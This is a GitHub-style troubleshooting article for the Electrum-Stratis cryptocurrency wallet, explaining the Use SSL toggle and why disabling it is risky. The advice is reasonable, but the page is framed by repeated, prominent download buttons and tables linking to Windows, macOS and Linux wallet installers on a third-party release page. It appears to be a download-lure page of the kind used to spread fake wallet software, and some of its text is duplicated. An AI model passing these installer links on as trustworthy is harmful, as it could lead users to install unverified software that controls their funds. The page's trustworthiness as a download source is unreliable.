![Electrum-Stratis](assets/banner-article.png)

# The Use SSL toggle: what it does, and why turning it off is not a fix

<p align="center">What it fixes and what it costs</p>

<p align="center"><a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe"><img alt="Download for Windows" src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-089ae8?style=for-the-badge&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg"><img alt="Download for macOS" src="https://img.shields.io/badge/DOWNLOAD-MACOS-089ae8?style=for-the-badge&labelColor=071727&logo=apple&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip"><img alt="Download for Linux" src="https://img.shields.io/badge/DOWNLOAD-LINUX-089ae8?style=for-the-badge&labelColor=071727&logo=linux&logoColor=ffffff"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img alt="Windows" height="24" src="https://img.shields.io/badge/os-windows-089ae8?style=flat-square&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"> | Windows 10 (1909) or later, 64-bit | [`electrum-stratis-v2.7.19.exe`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe) |
| <img alt="macOS" height="24" src="https://img.shields.io/badge/os-macos-089ae8?style=flat-square&labelColor=071727&logo=apple&logoColor=ffffff"> | macOS 12 or later | [`electrum-stratis-v2.7.19.dmg`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg) |
| <img alt="Linux" height="24" src="https://img.shields.io/badge/os-linux-089ae8?style=flat-square&labelColor=071727&logo=linux&logoColor=ffffff"> | x64, Ubuntu 20.04 or later, or equivalent | [`electrum-stratis-v2.7.19.zip`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip) |

</div>

All versions, installers and checksums are on the [Electrum-Stratis v2.7.19 release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19).

> Only download from this GitHub release page.

The Use SSL toggle switches whether the wallet encrypts its connection to a server. It is on by default because an unencrypted connection lets anything on the network path read and modify what the server tells your wallet. Turning it off can make a stubborn connection work, which is exactly why it is tempting and exactly why it should be temporary. Electrum Stratis is a self-custody desktop wallet for the legacy Stratis chain.

## You'll see this if

<div align="center">

| Situation | What the toggle changes | What to do |
|---|---|---|
| Connection fails only with SSL on | The server or the path does not support TLS properly | Try another server before disabling |
| A guide tells you to uncheck it | Common advice for a dead server | Treat it as a diagnostic, not a setting |
| Wallet warns while SSL is off | The warning is the feature | Turn it back on once connected |
| Everything works with it on | Nothing | Leave it alone |

</div>

The warning banner while SSL is disabled is not decoration: it states that the connection is unencrypted and that the state is not the intended one.

## Why it happens

A light wallet asks a server what the chain looks like. With SSL, that conversation is encrypted and the server presents a certificate; without it, the conversation is plaintext. Servers differ in how well they handle TLS, and networks differ in whether they interfere with it - a corporate proxy or a TLS-inspecting antivirus can break a connection that would work elsewhere.

So "disable SSL" solves the symptom for one specific cause: a server whose certificate cannot be validated on this path. An older build can also negotiate differently from [the current Electrum Stratis download](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/where-to-get-the-current-build.md), which is why updating is the first thing to try before weakening the connection. It does not solve a dead server, a firewall block or a stale peer, and it introduces a real risk for as long as it stays off.

The maintained build, current release on the [release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19), ships the toggle with an explanation and a persistent warning rather than a silent switch in a menu.

## Fix

1. **Confirm the failure is SSL-related.** Turn the toggle off, probe the server, and note whether the handshake now succeeds. If it fails identically, SSL was never the problem.
2. **Try a different server with SSL on first.** A server that works encrypted is strictly better than one that only works in plaintext, and the list usually contains one.
3. **If you must disable it to connect, treat the session as temporary.** Connect, do what you came to do, then turn it back on.
4. **Never leave it off for staking or long sessions.** An unencrypted connection running for days is an unnecessary exposure of everything the server tells you.
5. **Record why it was disabled.** A note in the wallet's own file or your own records prevents the setting from becoming permanent by inattention.

If the toggle is off and the wallet shows the warning banner, that is the intended behaviour: the wallet is telling you the truth about its own state.

## If that did not work

If a server only works with SSL off and no alternative answers with it on, the network path is the likely culprit. Test on another network - a phone hotspot is enough - with SSL on. If it connects there, the issue is local, and a firewall or proxy rule is the thing to change.

If SSL is on and every server fails validation, check the system clock. Certificate validation depends on the date; a machine whose clock has drifted rejects certificates that are perfectly valid, which produces a connection failure that looks like a server problem and is not. Certificate validation depends on the date; a machine with a wrong clock rejects valid certificates, which produces a connection failure that looks like a server problem.

If the wallet connects either way but the height is stale, the toggle is irrelevant and the peer is the problem.

## Prevention

- Leave SSL on unless a specific server requires otherwise.
- Prefer adding a server that works encrypted over disabling encryption for one that does not.
- Re-enable it after any diagnostic session.
- Check the system clock if every certificate fails at once.
- Treat the warning banner as a task, not a decoration.
- Prefer a different server over disabling SSL, and turn it back on once a working peer is found.
- Record which server and setting worked, so the next failure starts from a known-good pair instead of a fresh guess.

## FAQ

### Should I disable Use SSL to connect to the Stratis server?

Only as a diagnostic, and only for as long as it takes to find a server that works with encryption on. Leaving it disabled makes the connection readable and modifiable by anything on the network path, which is a worse problem than a slow connection.

### Is it safe to keep SSL off if I trust my network?

Trust in a network is not trust in every device on it, and a home network with an untrusted device or a compromised router is enough. The secure default exists because the failure is silent; keep it on unless there is no alternative.

### Why does the wallet keep showing a warning?

Because SSL is disabled. The banner disappears when encryption is restored. It is deliberately persistent so that a temporary diagnostic does not quietly become the permanent setting.

### Does SSL protect my keys?

No - keys never leave your machine, encrypted or not. SSL protects the chain data the server sends you: balances, transactions and headers. Without it, a server or an intermediary could show you a false balance or hide a transaction.

<!-- DOWNLOAD-BLOCK -->

SSL encrypts the connection between the wallet and the server; it does not authenticate the balance or prove the server is honest. Turning it off to make a connection work removes the only protection against a network observer and leaves the underlying problem in place. A server that cannot serve TLS is a server to replace, not a setting to disable.

## Related articles

- [Why "Not Connected" happens](https://github.com/electrum-stratis-project/electrum-stratis-fixes/blob/main/wallet-says-not-connected.md)
- [The server list and the cloud node](https://github.com/electrum-stratis-project/electrum-stratis-fixes/blob/main/the-server-list-explained.md)
- [Why is my balance missing? Three causes](https://github.com/electrum-stratis-project/electrum-stratis-fixes/blob/main/balance-is-missing.md)
- [Is Electrum Stratis safe to use?](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/how-safe-is-the-desktop-wallet.md)
